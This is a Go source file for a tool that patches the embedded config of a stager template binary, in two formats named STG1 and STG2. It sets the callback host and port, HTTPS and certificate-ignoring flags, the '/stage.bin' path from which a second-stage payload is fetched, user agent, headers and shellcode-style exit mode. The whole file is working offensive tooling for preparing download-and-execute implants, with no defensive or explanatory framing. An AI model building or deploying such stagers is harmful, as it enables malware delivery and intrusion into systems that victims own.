package main

import (
	"bytes"
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"
)

const (
	configMagicV1 = "STG1"
	configV1Size  = 1436

	offV1Version       = 4
	offV1Flags         = 8
	offV1CallbackPort  = 12
	offV1StageMaxSize  = 16
	offV1ReadChunkSize = 20
	offV1CallbackHost  = 24
	offV1BaseURI       = 280
	offV1StageID       = 536
	offV1UserAgent     = 664
	offV1Headers       = 920
	offV1ExitMode      = 1432

	lenV1CallbackHost = 256
	lenV1BaseURI      = 256
	lenV1StageID      = 128
	lenV1UserAgent    = 256
	lenV1Headers      = 512

	configMagicV2 = "STG2"
	configV2Size  = 284

	offV2Version       = 4
	offV2Flags         = 8
	offV2CallbackPort  = 12
	offV2StageMaxSize  = 16
	offV2ReadChunkSize = 20
	offV2ExitMode      = 24
	offV2CallbackHost  = 28
	offV2ObjectPath    = 156

	lenV2CallbackHost = 128
	lenV2ObjectPath   = 128

	flagHTTPS      = 1
	flagIgnoreCert = 2

	exitModeReturn  = 0
	exitModeThread  = 1
	exitModeProcess = 2
)

type patchOptions struct {
	inPath       string
	outPath      string
	scheme       string
	callbackHost string
	baseURI      string
	stageID      string
	userAgent    string
	headers      string
	port         uint
	stageMax     string
	chunkSize    uint
	exitMode     string
	https        bool
	ignoreCert   bool
	set          map[string]bool
}

func main() {
	var opt patchOptions

	flag.StringVar(&opt.inPath, "in", "", "input stager template bin or exe")
	flag.StringVar(&opt.outPath, "out", "", "output patched stager bin or exe")
	flag.StringVar(&opt.scheme, "scheme", "", "http or https")
	flag.StringVar(&opt.callbackHost, "host", "", "callback host")
	flag.StringVar(&opt.callbackHost, "callback-host", "", "callback host")
	flag.StringVar(&opt.baseURI, "base-uri", "", "stage base URI prefix")
	flag.StringVar(&opt.stageID, "stage-id", "", "stage identifier used in /base_uri/stage_id/stage.bin")
	flag.StringVar(&opt.userAgent, "ua", "", "User-Agent; STG2 templates ignore this")
	flag.StringVar(&opt.headers, "headers", "", "additional HTTP headers; unsupported by STG2 templates")
	flag.UintVar(&opt.port, "port", 0, "callback port")
	flag.StringVar(&opt.stageMax, "stage-max", "", "maximum stage size, decimal or 0x-prefixed")
	flag.UintVar(&opt.chunkSize, "chunk", 0, "read chunk size")
	flag.StringVar(&opt.exitMode, "exit-mode", "thread", "post-stage exit mode: thread or process")
	flag.BoolVar(&opt.https, "https", false, "enable HTTPS")
	flag.BoolVar(&opt.ignoreCert, "ignore-cert", false, "ignore HTTPS certificate errors")
	flag.Parse()

	if opt.inPath == "" || opt.outPath == "" {
		log.Fatalf("usage: patch_stager_config -in template.bin -out stager.bin -scheme http -host 127.0.0.1 -port 80 -base-uri /assets -stage-id stg_x")
	}

	opt.set = map[string]bool{}
	flag.Visit(func(f *flag.Flag) { opt.set[f.Name] = true })
	if opt.set["scheme"] && opt.set["https"] {
		log.Fatalf("use either -scheme or -https, not both")
	}
	switch strings.ToLower(opt.scheme) {
	case "":
	case "http":
		opt.https = false
	case "https":
		opt.https = true
	default:
		log.Fatalf("invalid -scheme %q, expected http or https", opt.scheme)
	}

	data, err := os.ReadFile(opt.inPath)
	if err != nil {
		log.Fatalf("read input: %v", err)
	}

	if base := bytes.Index(data, []byte(configMagicV2)); base >= 0 {
		patchV2(data, base, &opt)
	} else if base := bytes.Index(data, []byte(configMagicV1)); base >= 0 {
		patchV1(data, base, &opt)
	} else {
		log.Fatalf("config magic %q or %q not found", configMagicV2, configMagicV1)
	}

	if err := os.WriteFile(opt.outPath, data, 0o644); err != nil {
		log.Fatalf("write output: %v", err)
	}
	fmt.Printf("[+] output: %s\n", opt.outPath)
}

func patchV1(data []byte, base int, opt *patchOptions) {
	if base+configV1Size > len(data) {
		log.Fatalf("STG1 config block is truncated: offset=0x%X size=%d file=%d", base, configV1Size, len(data))
	}
	if version := binary.LittleEndian.Uint32(data[base+offV1Version:]); version != 3 {
		log.Fatalf("unsupported STG1 config version: %d", version)
	}

	flags := buildFlags(opt)
	binary.LittleEndian.PutUint32(data[base+offV1Flags:], flags)
	binary.LittleEndian.PutUint32(data[base+offV1CallbackPort:], uint32(resolvePort(opt)))
	patchCommonNumbers(data, base, opt, offV1StageMaxSize, offV1ReadChunkSize)

	if opt.callbackHost != "" {
		putCString(data[base+offV1CallbackHost:base+offV1CallbackHost+lenV1CallbackHost], opt.callbackHost, "host")
	}
	if opt.baseURI != "" {
		putCString(data[base+offV1BaseURI:base+offV1BaseURI+lenV1BaseURI], normalizeBaseURI(opt.baseURI), "base-uri")
	}
	if opt.stageID != "" {
		validateStageID(opt.stageID)
		putCString(data[base+offV1StageID:base+offV1StageID+lenV1StageID], opt.stageID, "stage-id")
	}
	if opt.userAgent != "" {
		putCString(data[base+offV1UserAgent:base+offV1UserAgent+lenV1UserAgent], opt.userAgent, "ua")
	}
	if opt.set["headers"] {
		putCString(data[base+offV1Headers:base+offV1Headers+lenV1Headers], decodeEscapes(opt.headers), "headers")
	}

	exitModeValue, exitModeName := parseExitMode(opt.exitMode, true)
	binary.LittleEndian.PutUint32(data[base+offV1ExitMode:], exitModeValue)

	host := cString(data[base+offV1CallbackHost : base+offV1CallbackHost+lenV1CallbackHost])
	baseURI := cString(data[base+offV1BaseURI : base+offV1BaseURI+lenV1BaseURI])
	stageID := cString(data[base+offV1StageID : base+offV1StageID+lenV1StageID])
	object := buildStageObject(baseURI, stageID)
	printSummary("STG1", base, flags, schemeName(flags), host, resolvePort(opt), exitModeName, exitModeValue, object)
}

func patchV2(data []byte, base int, opt *patchOptions) {
	if base+configV2Size > len(data) {
		log.Fatalf("STG2 config block is truncated: offset=0x%X size=%d file=%d", base, configV2Size, len(data))
	}
	if version := binary.LittleEndian.Uint32(data[base+offV2Version:]); version != 1 {
		log.Fatalf("unsupported STG2 config version: %d", version)
	}
	if opt.set["headers"] {
		log.Fatalf("STG2 templates do not support -headers")
	}
	if opt.set["ua"] {
		fmt.Fprintln(os.Stderr, "[!] STG2 templates ignore -ua")
	}

	flags := buildFlags(opt)
	binary.LittleEndian.PutUint32(data[base+offV2Flags:], flags)
	binary.LittleEndian.PutUint32(data[base+offV2CallbackPort:], uint32(resolvePort(opt)))
	patchCommonNumbers(data, base, opt, offV2StageMaxSize, offV2ReadChunkSize)

	if opt.callbackHost != "" {
		putCString(data[base+offV2CallbackHost:base+offV2CallbackHost+lenV2CallbackHost], opt.callbackHost, "host")
	}
	if opt.baseURI != "" || opt.stageID != "" {
		currentObject := cString(data[base+offV2ObjectPath : base+offV2ObjectPath+lenV2ObjectPath])
		baseURI, stageID := splitStageObject(currentObject)
		if opt.baseURI != "" {
			baseURI = opt.baseURI
		}
		if opt.stageID != "" {
			stageID = opt.stageID
		}
		validateStageID(stageID)
		object := buildStageObject(baseURI, stageID)
		putCString(data[base+offV2ObjectPath:base+offV2ObjectPath+lenV2ObjectPath], object, "object path")
	}

	exitModeValue, exitModeName := parseExitMode(opt.exitMode, false)
	binary.LittleEndian.PutUint32(data[base+offV2ExitMode:], exitModeValue)

	host := cString(data[base+offV2CallbackHost : base+offV2CallbackHost+lenV2CallbackHost])
	object := cString(data[base+offV2ObjectPath : base+offV2ObjectPath+lenV2ObjectPath])
	printSummary("STG2", base, flags, schemeName(flags), host, resolvePort(opt), exitModeName, exitModeValue, object)
}

func patchCommonNumbers(data []byte, base int, opt *patchOptions, offStageMax int, offChunk int) {
	if opt.set["stage-max"] {
		v, err := parseUint32(opt.stageMax)
		if err != nil {
			log.Fatalf("invalid -stage-max: %v", err)
		}
		binary.LittleEndian.PutUint32(data[base+offStageMax:], v)
	}
	if opt.set["chunk"] {
		if opt.chunkSize == 0 || opt.chunkSize > 1<<20 {
			log.Fatalf("invalid chunk size: %d", opt.chunkSize)
		}
		binary.LittleEndian.PutUint32(data[base+offChunk:], uint32(opt.chunkSize))
	}
}

func buildFlags(opt *patchOptions) uint32 {
	var flags uint32
	if opt.https {
		flags |= flagHTTPS
	}
	if opt.ignoreCert {
		flags |= flagIgnoreCert
	}
	return flags
}

func resolvePort(opt *patchOptions) uint {
	if opt.set["port"] {
		if opt.port == 0 || opt.port > 65535 {
			log.Fatalf("invalid port: %d", opt.port)
		}
		return opt.port
	}
	if opt.https {
		return 443
	}
	return 80
}

func printSummary(kind string, base int, flags uint32, scheme string, host string, port uint, exitModeName string, exitModeValue uint32, object string) {
	fmt.Printf("[+] patched %s config at file offset 0x%X\n", kind, base)
	fmt.Printf("[+] flags=0x%X scheme=%s callback=%s:%d\n", flags, scheme, host, port)
	fmt.Printf("[+] exit_mode=%s(%d)\n", exitModeName, exitModeValue)
	fmt.Printf("[+] object=%q url=%s://%s:%d%s\n", object, scheme, host, port, object)
}

func parseUint32(text string) (uint32, error) {
	v, err := strconv.ParseUint(text, 0, 32)
	return uint32(v), err
}

func putCString(dst []byte, value string, name string) {
	if len(value) >= len(dst) {
		log.Fatalf("%s is too long: %d >= %d", name, len(value), len(dst))
	}
	for i := range dst {
		dst[i] = 0
	}
	copy(dst, value)
}

func cString(data []byte) string {
	if i := bytes.IndexByte(data, 0); i >= 0 {
		data = data[:i]
	}
	return string(data)
}

func normalizeBaseURI(value string) string {
	if value == "" {
		return "/"
	}
	if !strings.HasPrefix(value, "/") {
		value = "/" + value
	}
	for len(value) > 1 && strings.HasSuffix(value, "/") {
		value = strings.TrimSuffix(value, "/")
	}
	return value
}

func buildStageObject(baseURI string, stageID string) string {
	baseURI = normalizeBaseURI(baseURI)
	if stageID == "" {
		if baseURI == "/" {
			return "/stage.bin"
		}
		return baseURI + "/stage.bin"
	}
	if baseURI == "/" {
		return "/" + stageID + "/stage.bin"
	}
	return baseURI + "/" + stageID + "/stage.bin"
}

func splitStageObject(object string) (string, string) {
	const suffix = "/stage.bin"

	if !strings.HasPrefix(object, "/") || !strings.HasSuffix(object, suffix) {
		return "/", ""
	}
	prefix := strings.TrimSuffix(object, suffix)
	if prefix == "" || prefix == "/" {
		return "/", ""
	}
	idx := strings.LastIndex(prefix, "/")
	if idx <= 0 {
		return "/", strings.TrimPrefix(prefix, "/")
	}
	return normalizeBaseURI(prefix[:idx]), prefix[idx+1:]
}

func validateStageID(stageID string) {
	if strings.ContainsAny(stageID, `/\`) {
		log.Fatalf("stage-id must not contain path separators: %q", stageID)
	}
}

func parseExitMode(value string, allowReturn bool) (uint32, string) {
	switch strings.ToLower(strings.TrimSpace(value)) {
	case "", "thread", "exit-thread", "1":
		return exitModeThread, "thread"
	case "process", "exit-process", "2":
		return exitModeProcess, "process"
	case "return", "ret", "0":
		if allowReturn {
			return exitModeReturn, "return"
		}
		log.Fatalf("STG2 templates do not support -exit-mode %q; use thread or process", value)
	default:
		log.Fatalf("invalid -exit-mode %q, expected thread or process", value)
	}
	return exitModeThread, "thread"
}

func schemeName(flags uint32) string {
	if flags&flagHTTPS != 0 {
		return "https"
	}
	return "http"
}

func decodeEscapes(text string) string {
	text = strings.ReplaceAll(text, `\r`, "\r")
	text = strings.ReplaceAll(text, `\n`, "\n")
	text = strings.ReplaceAll(text, `\t`, "\t")
	return text
}
